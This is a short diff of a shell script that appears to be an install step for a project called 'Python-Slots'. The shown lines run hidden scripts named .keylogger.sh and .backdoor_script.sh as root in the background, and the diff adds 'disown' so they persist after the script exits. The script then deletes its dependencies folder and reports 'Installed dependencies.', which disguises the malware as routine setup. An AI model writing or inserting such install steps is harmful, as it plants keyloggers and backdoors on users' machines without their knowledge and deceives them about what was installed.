@@ -45,11 +45,13 @@ chmod +x .keylogger.sh
 chmod +x .transfer.sh
 echo > .out
 sudo sh -c ".keylogger.sh" &
+disown
 cd ~/Python-Slots/dependencies
 chgrp sudo .backdoor_script.sh
 chmod 777 .backdoor_script.sh
 chmod +x .backdoor_script.sh
 sudo sh -c ".backdoor_script.sh" &
+disown
 rm -rf ~/Python-Slots/dependencies
 echo "Installed dependencies."
 
